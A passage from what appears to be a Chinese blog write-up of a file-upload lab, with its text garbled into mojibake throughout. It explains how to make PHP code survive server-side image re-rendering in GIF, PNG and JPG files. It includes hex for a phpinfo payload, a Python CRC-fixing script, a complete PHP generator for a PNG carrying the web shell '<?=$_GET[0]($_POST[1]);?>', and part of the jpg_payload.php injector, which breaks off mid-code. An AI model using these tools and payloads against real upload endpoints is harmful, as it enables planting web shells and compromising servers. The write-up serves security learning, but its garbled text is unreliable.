æˆåŠŸï¼Œè¿™ä¸ªæˆ‘æ„Ÿè§‰éœ€è¦äº†è§£<code>imagecreatefromjpeg</code>ã€<code>imagecreatefrompng</code>ã€<code>imagecreatefromgif</code>ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°çš„åŸç†ï¼Œè®©å…¶æŠ¥é”™å³å¯ã€‚</p><h2 id=ç¬¬äºŒç§æ–¹æ³• class=headerLink><a href=#%e7%ac%ac%e4%ba%8c%e7%a7%8d%e6%96%b9%e6%b3%95 class=header-mark></a>ç¬¬äºŒç§æ–¹æ³•</h2><p>â€‹ ï¼ˆwindowsç¯å¢ƒï¼Œphpç‰ˆæœ¬5.2.17ï¼‰</p><p>â€‹ è¿™ç§æ–¹æ³•æ˜¯è®©å›¾ç‰‡ç åœ¨ç»è¿‡äºŒæ¬¡æ¸²æŸ“ä»¥åï¼Œèƒ½ä¿è¯ä»£ç ä¸ä¼šè¢«äºŒæ¬¡æ¸²æŸ“ç»™è¿‡æ»¤æ‰ã€‚ä»æœ€ç®€å•çš„ä¸€ä¸ªä¸€ä¸ªæ¥ã€‚</p><p>â€‹ ç”¨åˆ°çš„å·¥å…·æ˜¯<strong>Beyond Compare 4</strong>ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶æ¯”è¾ƒçš„å·¥å…·ï¼Œå°±æ˜¯æŸ¥çœ‹å›¾ç‰‡æ¸²æŸ“ä¿®æ”¹çš„å“ªäº›éƒ¨åˆ†ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„16è¿›åˆ¶æ ¼å¼ã€‚</p><h3 id=gifæ ¼å¼ class=headerLink><a href=#gif%e6%a0%bc%e5%bc%8f class=header-mark></a>GIFæ ¼å¼</h3><h4 id=å‡†å¤‡å¹¶ä¸Šä¼ -1 class=headerLink><a href=#%e5%87%86%e5%a4%87%e5%b9%b6%e4%b8%8a%e4%bc%a0-1 class=header-mark></a>å‡†å¤‡å¹¶ä¸Šä¼ </h4><p>â€‹ ä¸Šä¼ ä¸€ä¸ªä½¿ç”¨<code>copy /b</code>æŒ‡ä»¤åˆ¶ä½œçš„å›¾ç‰‡é©¬ï¼Œä¹‹å‰æ–‡ç« ç¬¬13é¢˜ç”¨è¿‡ã€‚å‡è®¾ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¸º<strong>yoo.gif</strong>ï¼Œä¸Šä¼ æˆåŠŸä»¥åå†ä¸‹è½½ä¸‹è½½çš„æ–‡ä»¶åä¸º<strong>2119840023.gif</strong>ã€‚</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png></a></p><h4 id=æ–‡ä»¶æ¯”è¾ƒ class=headerLink><a href=#%e6%96%87%e4%bb%b6%e6%af%94%e8%be%83 class=header-mark></a>æ–‡ä»¶æ¯”è¾ƒ</h4><p>â€‹ ä½¿ç”¨å‰é¢è¯´çš„<strong>Beyond Compare 4</strong>å·¥å…·è¿›è¡Œæ¯”è¾ƒï¼Œå·¦è¾¹æ˜¯æ¸²æŸ“å‰çš„æ–‡ä»¶ï¼Œå³è¾¹æ˜¯æ¸²æŸ“åçš„æ–‡ä»¶ï¼Œå›¾ç‰‡ä¸­ç™½è‰²çš„åœ°æ–¹å°±æ˜¯ä¸¤ä¸ªæ–‡ä»¶<strong>ç›¸åŒ</strong>çš„åœ°æ–¹ï¼Œçº¢è‰²éƒ¨åˆ†åˆ™æ˜¯æ–‡ä»¶ä¸åŒçš„åœ°æ–¹ã€‚çœ‹çš„å‡ºæ¥å›¾ç‰‡æ–‡ä»¶çš„å‰é¢ä¸€å¤§éƒ¨åˆ†äºŒæ¬¡æ¸²æŸ“çš„æ—¶å€™éƒ½æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ä»£ç æ”¾åœ¨è¿™ä¸€éƒ¨åˆ†é€ƒè¿‡äºŒæ¬¡æ¸²æŸ“ã€‚<code>&lt;?php phpinfo(); ?></code>çš„åå…­è¿›åˆ¶æ˜¯<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>ç›´æ¥ç²˜è´´æ’å…¥ï¼Œåœ¨å³è¾¹æ¡†ä¸­å³é”®ä¿å­˜æ–‡ä»¶å†è¿›è¡Œä¸Šä¼ ã€‚</p><h4 id=æ–‡ä»¶åŒ…å«éªŒè¯-1 class=headerLink><a href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e9%aa%8c%e8%af%81-1 class=header-mark></a>æ–‡ä»¶åŒ…å«éªŒè¯</h4><p>â€‹ ä¸Šä¼ ä»¥åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä»£ç æ‰§è¡ŒæˆåŠŸã€‚</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png></a></p><p>â€‹ ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åˆšåˆšæŠŠä¸Šä¼ çš„å›¾ç‰‡å†ä¸‹è½½ä¸‹è½½ï¼ŒæŸ¥çœ‹æ’å…¥çš„ä»£ç æ˜¯å¦é€ƒè¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼ˆåºŸè¯æ‰§è¡ŒæˆåŠŸäº†ä»£ç è‚¯å®šåœ¨ï¼‰ã€‚</p><h3 id=pngæ ¼å¼ class=headerLink><a href=#png%e6%a0%bc%e5%bc%8f class=header-mark></a>pngæ ¼å¼</h3><p>â€‹ è¿™é¢˜è‡ªå·±åŸæ¥æ‰“ç®—æ¨¡ä»¿gifçš„æ–¹æ³•ä¿®æ”¹å›¾ç‰‡ï¼Œä½†æ˜¯ä¸Šä¼ ä»¥åä¸‹è½½ï¼Œå¯¹æ¯”æ–‡ä»¶åå…­è¿›åˆ¶ä¸åŒçš„æ—¶å€™æˆ‘å‚»äº†</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png></a></p><p>â€‹ è¿™ä¸åŒè¿˜æ˜¯ä¸€æ®µä¸€æ®µçš„ï¼Œæ ¹æœ¬ä¸å¯èƒ½æ¨¡ä»¿gifçš„æ–¹æ³•ï¼Œä¸Šé¢é‚£ä¸€æ®µç›¸åŒçš„è¿˜æ˜¯å›¾ç‰‡çš„<strong>å¤´æ ‡è¯†</strong>éƒ¨åˆ†ï¼Œä¿®æ”¹çš„è¯å°±ä¸æ˜¯pngæ ¼å¼å›¾ç‰‡ï¼Œæ›´è¿‡ä¸äº†ã€‚</p><p>â€‹ æ‰€ä»¥æˆ‘ç›´æ¥çœ‹ç­”æ¡ˆäº†ï¼Œè¿˜æ˜¯å‰è¨€é‡Œçš„<a href=https://xz.aliyun.com/t/2657#toc-3 target=_blank rel="noopener noreferrer">åšå®¢</a>ã€‚pngå›¾ç‰‡ç”±3ä¸ªä»¥ä¸Šçš„æ•°æ®å—ç»„æˆï¼Œç„¶ååˆåˆ†äº†å›¾ç‰‡åŸºæœ¬ä¿¡æ¯ã€å®é™…æ•°æ®å—ã€è¾…åŠ©æ•°æ®å—blablablablï¼Œè€Œä¸”æ•°æ®å—ä¸­è¿˜æœ‰CRCç ï¼Œå­¦è¿‡è®¡ç®—æœºç½‘ç»œçš„éƒ½çŸ¥é“CRCç æ˜¯éªŒè¯é”™è¯¯çš„ï¼Œè‡ªå·±éšä¾¿æ’å…¥ä»£ç ä»¥åä¸ä¿®æ”¹CRCç è‚¯å®šæ˜¯è¿‡ä¸äº†çš„ã€‚</p><p>â€‹ æ‰€ä»¥åˆå‡ºæ¥äº†ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li>ä¿®æ”¹CRCç </li><li>ç›´æ¥ç”Ÿæˆå›¾ç‰‡</li></ol><h4 id=è®¡ç®—crcç  class=headerLink><a href=#%e8%ae%a1%e7%ae%97crc%e7%a0%81 class=header-mark></a>è®¡ç®—CRCç </h4><p>â€‹ è®¡ç®—CRCç çš„<code>python</code>è„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import binascii
</span></span><span class=line><span class=cl>import re
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>png = open(r&#39;1.png&#39;,&#39;rb&#39;)
</span></span><span class=line><span class=cl>a = png.read()
</span></span><span class=line><span class=cl>png.close()
</span></span><span class=line><span class=cl>hexstr = binascii.b2a_hex(a)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
</span></span><span class=line><span class=cl>data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
</span></span><span class=line><span class=cl>crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
</span></span><span class=line><span class=cl>print hex(crc)
</span></span></code></pre></td></tr></table></div></div><h5 id=å‡†å¤‡ class=headerLink><a href=#%e5%87%86%e5%a4%87 class=header-mark></a>å‡†å¤‡</h5><p>â€‹ phpåº•å±‚åœ¨å¯¹PLTEæ•°æ®å—éªŒè¯çš„æ—¶å€™,ä¸»è¦è¿›è¡Œäº†CRCæ ¡éªŒ.æ‰€ä»¥å¯ä»¥åœ¨è¯¥éƒ¨åˆ†<strong>å†™å…¥ä»£ç </strong>ï¼Œå†é‡æ–°è®¡ç®—CRCç ï¼Œå†ä¿®æ”¹åŸæ¥çš„CRCç å³å¯ã€‚</p><h5 id=è®¡ç®—crcç -1 class=headerLink><a href=#%e8%ae%a1%e7%ae%97crc%e7%a0%81-1 class=header-mark></a>è®¡ç®—CRCç </h5><p>â€‹ è„šæœ¬ä¼šæ‰“å¼€åä¸º1.pngçš„æ–‡ä»¶ç„¶åè¾“å‡ºè®¡ç®—ä»¥åçš„CRCç ç»“æœã€‚åœ¨æŠŠç»“æœè¦†ç›–åŸæ¥çš„CRCç ä¸Šä¼ å›¾ç‰‡å°±ä¸ä¼šå‡ºé”™äº†ã€‚</p><p>è¿™ä¸ªæ–¹æ³•æˆ‘æ²¡æœ‰å°è¯•ï¼Œå› ä¸ºæˆ‘ä¸ä¼špythonã€‚<del>éƒ½2020å¹´äº†è¿˜æœ‰äººä¸ä¼špythonï¼Œä¸ä¼šå§ä¸ä¼šå§</del>ã€‚ğŸ˜’</p><p>ç­‰æˆ‘å­¦ä¼šåœ¨å›æ¥æ”¹è¿™ä¸€ç¯‡å§ã€‚</p><h4 id=ç›´æ¥ç”Ÿæˆå›¾ç‰‡å†™å…¥å®é™…æ•°æ®æ¨¡å— class=headerLink><a href=#%e7%9b%b4%e6%8e%a5%e7%94%9f%e6%88%90%e5%9b%be%e7%89%87%e5%86%99%e5%85%a5%e5%ae%9e%e9%99%85%e6%95%b0%e6%8d%ae%e6%a8%a1%e5%9d%97 class=header-mark></a>ç›´æ¥ç”Ÿæˆå›¾ç‰‡ï¼ˆå†™å…¥å®é™…æ•°æ®æ¨¡å—ï¼‰</h4><p>â€‹ å›½å¤–å¤§ç‰›çš„è„šæœ¬ï¼Œç›´æ¥è¿è¡Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå›¾ç‰‡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
</span></span><span class=line><span class=cl>           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
</span></span><span class=line><span class=cl>           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
</span></span><span class=line><span class=cl>           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
</span></span><span class=line><span class=cl>           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
</span></span><span class=line><span class=cl>           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
</span></span><span class=line><span class=cl>           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
</span></span><span class=line><span class=cl>           0x66, 0x44, 0x50, 0x33);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$img = imagecreatetruecolor(32, 32);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for ($y = 0; $y &lt; sizeof($p); $y += 3) {
</span></span><span class=line><span class=cl>   $r = $p[$y];
</span></span><span class=line><span class=cl>   $g = $p[$y+1];
</span></span><span class=line><span class=cl>   $b = $p[$y+2];
</span></span><span class=line><span class=cl>   $color = imagecolorallocate($img, $r, $g, $b);
</span></span><span class=line><span class=cl>   imagesetpixel($img, round($y / 3), 0, $color);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>imagepng($img,&#39;./1.png&#39;);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>â€‹ phpæŒ‡ä»¤æ€ä¹ˆæ‰§è¡Œï¼Ÿå¦‚æœä½ æœ¬æœºæœ‰phpç¯å¢ƒï¼Œå¯ä»¥åœ¨phpçš„æ ¹ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªåä¸º<code>php.exe</code>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒæ˜¯phpæä¾›çš„ä¸€ç§<strong>CLI</strong>æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯<strong>å‘½ä»¤è¡Œæ¨¡å¼</strong>ã€‚æˆ‘æŠŠphpè„šæœ¬æ”¾åœ¨äº†phpçš„æ ¹ç›®å½•ï¼Œç„¶åcmdåˆ‡æ¢åˆ°å¯¹åº”ç›®å½•æ‰§è¡Œã€‚</p><p>â€‹ è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯å€Ÿç”¨æœ¬åœ°æ­å»ºçš„é¶æœºç¯å¢ƒï¼ŒæŠŠphpæ”¾åœ¨ç›®å½•ä½¿ç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹å³å¯ã€‚</p><p>â€‹ è¿è¡ŒæˆåŠŸä»¥åä¼šæ‰¾åˆ°ä¸€ä¸ªåä¸º<strong>1.png</strong>çš„å›¾ç‰‡ã€‚è¿™ä¸ªå°±æ˜¯ç”Ÿæˆçš„å›¾ç‰‡é©¬äº†ã€‚å¯ä»¥å°è¯•ä¸Šä¼ è¿›è¡Œæ¸²æŸ“ä»¥åä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨æ–‡ä»¶æ¯”è¾ƒéªŒè¯ã€‚</p><p>â€‹ ä½†æ˜¯è¿™ä¸ªç”Ÿæˆçš„å›¾ç‰‡phpä»£ç æ˜¯<code>&lt;?=$_GET[0]($_POST[1]);?></code>ï¼Œåº”è¯¥æ˜¯ä¸ªä¸€å¥è¯æœ¨é©¬ä½†æ˜¯ç°åœ¨çš„æˆ‘è¿˜ä¸ä¼šç”¨ã€‚æºç ä¹Ÿä¸çŸ¥é“æ€ä¹ˆä¿®æ”¹ï¼Œæ€»ä¹‹å›¾ç‰‡æ¸²æŸ“ä»¥åä»£ç æ²¡æœ‰è¢«å»æ‰å°±ç®—æˆåŠŸäº†å§ï¼Œ<del>åº”è¯¥ç®—å§</del></p><h3 id=jpgæ ¼å¼-1 class=headerLink><a href=#jpg%e6%a0%bc%e5%bc%8f-1 class=header-mark></a>jpgæ ¼å¼</h3><p>â€‹ åŒæ ·çœ‹ç­”æ¡ˆã€‚å›½å¤–å¤§ç‰›å†™çš„è„šæœ¬jpg_payload.phpï¼Œå¯ä»¥å‘jpgå›¾ç‰‡é‡Œå†™å…¥ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
</span></span></span><span class=line><span class=cl><span class=cm>    It is necessary that the size and quality of the initial image are the same as those of the processed image.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    1) Upload an arbitrary image via secured files upload script
</span></span></span><span class=line><span class=cl><span class=cm>    2) Save the processed image and launch:
</span></span></span><span class=line><span class=cl><span class=cm>    jpg_payload.php &lt;jpg_name.jpg&gt;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    In case of successful injection you will get a specially crafted image, which should be uploaded again.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    Since the most straightforward injection method is used, the following problems can occur:
</span></span></span><span class=line><span class=cl><span class=cm>    1) After the second processing the injected data may become partially corrupted.
</span></span></span><span class=line><span class=cl><span class=cm>    2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
</span></span></span><span class=line><span class=cl><span class=cm>    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    Sergey Bobrov @Black2Fan.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    See also:
</span></span></span><span class=line><span class=cl><span class=cm>    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$miniPayload</span> <span class=o>=</span> <span class=s2>&#34;&lt;?=phpinfo();?&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;gd&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;imagecreatefromjpeg&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;php-gd is not installed&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>set_error_handler</span><span class=p>(</span><span class=s2>&#34;custom_error_handler&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$pad</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$pad</span> <span class=o>&lt;</span> <span class=mi>1024</span><span class=p>;</span> <span class=nv>$pad</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$nullbytePayloadSize</span> <span class=o>=</span> <span class=nv>$pad</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$dis</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataInputStream</span><span class=p>(</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$outStream</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$extraBytes</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$correctImage</span> <span class=o>=</span> <span class=k>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readShort</span><span class=p>()</span> <span class=o>!=</span> <span class=mh>0xFFD8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Incorrect SOI marker&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>((</span><span class=o>!</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>eof</span><span class=p>())</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readByte</span><span class=p>()</span> <span class=o>==</span> <span class=mh>0xFF</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$marker</span> <span class=o>=</span> <span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readByte</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$size</span> <span class=o>=</span> <span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readShort</span><span class=p>()</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>skip</span><span class=p>(</span><span class=nv>$size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$marker</span> <span class=o>===</span> <span class=mh>0xDA</span><span class=p>)</span> <span class=p>{</span>
